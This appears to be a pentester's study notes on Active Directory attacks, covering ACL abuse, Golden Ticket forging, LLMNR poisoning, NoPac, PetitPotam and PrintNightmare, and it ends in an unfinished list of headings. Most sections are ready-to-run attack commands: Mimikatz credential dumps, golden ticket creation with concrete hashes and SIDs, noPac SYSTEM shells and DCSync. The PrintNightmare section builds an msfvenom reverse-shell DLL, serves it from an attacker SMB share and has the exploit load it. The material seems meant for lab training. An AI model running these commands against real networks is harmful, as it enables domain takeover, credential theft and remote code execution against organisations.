# active directory attacks enumeration


## ACL

### Addself

    Addself abused with Add-DomainGroupMember

Shows security groups that a user can add themselves to.

### ForceChangePassword

    Abused with Set-DomainUserPassword
    https://github.com/Andre92Marcos/tools/blob/master/powersploit/PowerView.md#functions

Gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).

### GenericWrite

    Abused with Set-DomainObject

Gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.


### GenericAll

    Abused with Set-DomainUserPassword or Add-DomainGroupMember

This grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

### WriteOwner

    Abuse with bloodyAD

    bloodyAD --host <host_ip> -d '<domain_name>' -u '<username>' -p '<password>' set owner <group_name> <name_of_new_owner>
    dacledit.py -action 'write' -rights 'FullControl' -principal '<username_of_new_owner>' -target '<username_being_owned>' '<domain_name>'/'<username_new_owner>':'<password_new_owner>' # to give full control

https://github.com/Andre92Marcos/tools/tree/master/bloodyAD







## Golden Ticket

A Golden Ticket attack is a type of attack in Microsoft Active Directory (AD) environments where an attacker forges a Kerberos ticket (TGT – Ticket Granting Ticket) to impersonate any user, typically a Domain Admin, within the Active Directory domain. This attack enables the attacker to gain unauthorized access to resources and escalate privileges, allowing them to move freely within the network.

### How Golden Ticket Attacks Work:
1. **KRBTGT Account:** The KRBTGT account is a special account used by the **Domain Controller (DC)** to encrypt and sign all Kerberos tickets. The NTLM hash of this account is a crucial part of the Golden Ticket attack.
   
2. **Attacker's Goal:** The attacker needs to gain access to the **KRBTGT NTLM hash**. This can be achieved through:
   - **Dumping Active Directory hashes** using tools like **Mimikatz** or **Kerberos Exploitation (kerb2)**.
   - **Compromising a Domain Controller** and extracting the hash directly from the DC.

3. **Forging the Golden Ticket:**
   - Once the attacker has the KRBTGT NTLM hash, they can use it to forge a **Golden Ticket**.
   - The **Golden Ticket** is created with the attacker’s desired information, such as impersonating a **Domain Admin**.
   - The ticket is forged using tools like **Mimikatz**, which takes the **KRBTGT hash**, the target user’s information, and creates a valid TGT.

4. **Accessing Resources:** The forged TGT is then used by the attacker to request service tickets (TGS) for access to various resources, such as domain controllers, file shares, etc. The ticket is accepted by the KDC because it is signed using the KRBTGT account’s NTLM hash, making it appear legitimate.

5. **Persistence:** The attacker can use the Golden Ticket for as long as they wish, provided the **KRBTGT password** is not changed. The attacker can maintain persistent access to the domain even if their original access is detected and revoked, until the KRBTGT password is reset.

### Tools Used in Golden Ticket Attacks:

- **Mimikatz:** A popular tool used for extracting the KRBTGT NTLM hash and forging Golden Tickets.
- **Impacket:** A toolkit that includes tools to interact with Kerberos and perform attacks, such as forging tickets.
- **Rubeus:** A powerful tool that can be used for Kerberos ticket extraction and manipulation, including creating Golden Tickets.

### Execution

First, dump the KRBTGT NTLM hash using Mimikatz:

    mimikatz.exe "privilege::debug" "lsadump::sam" exit

    or

    mimikatz # lsadump::lsa /inject /name:krbtgt

Use the extracted NTLM hash to create a Golden Ticket:

    mimikatz.exe "kerberos::ptt /user:Administrator /rc4:<KRBTGT NTLM HASH> /domain:example.com /sid:<DOMAIN SID> /ticket:<BASE64 ENCODED TICKET>"
    mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

    or using rubeus

    .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

    or using impacket

    ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker





## LLMNR/NBT-NS Poisoning

https://github.com/Andre92Marcos/vulnerabilities/blob/master/ldap/llmnr_ntbt-ns_poisoning.md

From Linux

    sudo responder -I <nerwork_interface>


## NoPac - SamAccountName Spoofing

This vulnerability encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.

This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.

We can use this tool to perform this attack. NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC.

    https://github.com/Ridter/noPac

We can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable.

    sudo python3 scanner.py <domain_name>/<domain_username>:<domain_user_password> -dc-ip <domain_controller_ip> -use-ldap

There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.

    sudo python3 noPac.py <domain_name>/<domain_username>:<domain_user_password> -dc-ip <domain_controller_ip>  -dc-host <domain_controller_host_name> -shell --impersonate administrator -use-ldap

Using noPac to DCSync the Built-in Administrator Account

    sudo python3 noPac.py <domain_name>/<domain_username>:<domain_user_password> -dc-ip <domain_controller_ip>  -dc-host <domain_controller_host_name> --impersonate administrator -use-ldap -dump -just-dc-user <domain_name>/administrator








## PetitPotam (MS-EFSRPC)

PetitPotam is a critical vulnerability (CVE-2021-36942) that was discovered in Microsoft Windows' MS-EFSRPC (Microsoft Encrypting File System Remote Protocol), which is used for communication between Windows machines in an Active Directory environment. This vulnerability allows an attacker to escalate privileges or perform NTLM relay attacks by forcing a vulnerable Windows machine to authenticate to an attacker-controlled server, potentially allowing the attacker to gain administrative privileges.If MS-EFSRPC is exposed to the network and is vulnerable, it may be a vector for the attack.

### Overview of PetitPotam (CVE-2021-36942)
- **Vulnerability Type:** NTLM Relay / Authentication Bypass.
- **Impact:** The vulnerability allows attackers to escalate privileges and potentially take over a Windows domain controller, leading to full domain compromise.
- **Discovery Date:** July 2021.
- **Affected Components:**
  - MS-EFSRPC (Microsoft Encrypting File System Remote Protocol)
  - Active Directory Domain Services (AD DS)
  - Other services relying on NTLM authentication.

### How PetitPotam Works:
The vulnerability exists in the way Windows handles NTLM authentication during communication between systems in an Active Directory domain. Specifically, an attacker can use **MS-EFSRPC** to force a machine to authenticate with an attacker-controlled server. By leveraging the NTLM relay attack, an attacker can capture the authentication request and relay it to other machines or services, such as a **domain controller**.

Here's a general breakdown of the attack flow:
1. **MS-EFSRPC Vulnerability:** The attacker sends a specially crafted request to a vulnerable Windows system, triggering the system to use NTLM authentication for communication.
2. **NTLM Relay Attack:** The attacker intercepts the NTLM authentication request and relays it to a target machine (e.g., a domain controller or another Windows machine) that will accept the authentication.
3. **Privilege Escalation:** If successful, the attacker can gain administrative privileges on the target machine, which may include full control of the domain or other services.

### Affected Versions:
PetitPotam affects the following Windows versions and configurations:
- **Windows Server** (including versions used in Active Directory environments).
- **Windows 10** and other systems that may communicate with Windows Server.
- Specifically, any system where MS-EFSRPC is exposed and NTLM authentication is used.

### Attack Scenarios:
1. **Domain Controller Compromise:**
   - An attacker can relay authentication requests to a domain controller and potentially compromise the entire domain.
2. **Privilege Escalation in AD Environments:**
   - By targeting machines that are part of an Active Directory domain, attackers could escalate their privileges from a low-privileged user to an administrator or domain admin.

### Execution

Get the petitpotam git repo:

    git clone https://github.com/topotam/PetitPotam.git

Check for the vulnerability, by testing if MS-EFSRPC is accessible:

    rpcclient -U "" -N <domain_controller_ip> -c "srvinfo"

    or impacket's

    rpcdump <domain_controller_ip>

    or just run the petitpotam python script bellow


Execute the PetitPotam exploit by specifying the IP address of the attack host (172.16.5.255) and the target Domain Controller (172.16.5.5). 

    python3 PetitPotam.py 172.16.5.225 172.16.5.5

## PrintNightmare

PrintNightmare is a critical security vulnerability (CVE-2021-34527) discovered in the Windows Print Spooler service, which is responsible for managing print jobs on a Windows system. The vulnerability allows attackers to remotely execute code with system-level privileges, potentially leading to full system compromise.

### Overview of PrintNightmare (CVE-2021-34527)
- **Affected Component:** Windows Print Spooler service.
- **Vulnerability Type:** Remote Code Execution (RCE).
- **Impact:** Allows remote attackers to execute arbitrary code on affected systems with SYSTEM privileges, potentially taking full control of the system.
- **Discovery Date:** June 2021.
- **Affected Versions:** Various versions of Windows, including Windows 7, 8, 10, and Windows Server editions.

### How PrintNightmare Works
The vulnerability stems from improper handling of print spooler requests, allowing an attacker to inject malicious code into the spooler service. An attacker could exploit this vulnerability to gain elevated privileges and execute arbitrary code on the affected system.

1. **Remote Code Execution:** An attacker can remotely trigger the vulnerability by sending a specially crafted print job or by remotely interacting with the vulnerable Print Spooler service, typically through SMB (Server Message Block) or RPC (Remote Procedure Call).
  
2. **Privilege Escalation:** Once an attacker can execute code in the context of the Print Spooler service, they can achieve SYSTEM-level privileges, allowing them to perform actions such as installing malware, altering system configurations, and compromising sensitive data.

3. **Exploitation Vector:** Since the vulnerability is present in the Print Spooler service, an attacker doesn't need physical access to a system to exploit it, making it a high-risk vulnerability for remote exploitation.


### Exploitation Scenarios
- **Remote Attacks:** Attackers can exploit the vulnerability remotely via network protocols like SMB or RPC to compromise machines that have the Print Spooler service running.
- **Local Attacks:** If an attacker has local access to a machine, they could leverage this vulnerability to escalate privileges to SYSTEM and take control of the system.

### Execution
Install PrintNightmare from cube0x0 exploit using git from a Linux-based host

    git clone https://github.com/cube0x0/CVE-2021-1675.git

    also try

    https://github.com/dievus/printspoofer

Check if a Windows target has MS-PAR & MSRPRN exposed

    rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Generate a DLL payload to be used by the exploit to gain a shell session.

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll

Create an SMB server and host a shared folder (CompData) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host.


    sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

Executes the exploit and specifies the location of the DLL payload

    sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'


## Shadow Credentials




Shadow Credentials
Pass the hash attacks
Active Directory Certificate Services (AD CS) attacks
Kerberos Constrained Delegation
Kerberos Unconstrained Delegation
Kerberos Resource-Based Constrained Delegation (RBCD)
Kerberos: Silver Tickets


WriteOwner abused with Set-DomainObjectOwner
WriteDACL abused with Add-DomainObjectACL
AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
Add Members abused with Add-DomainGroupMember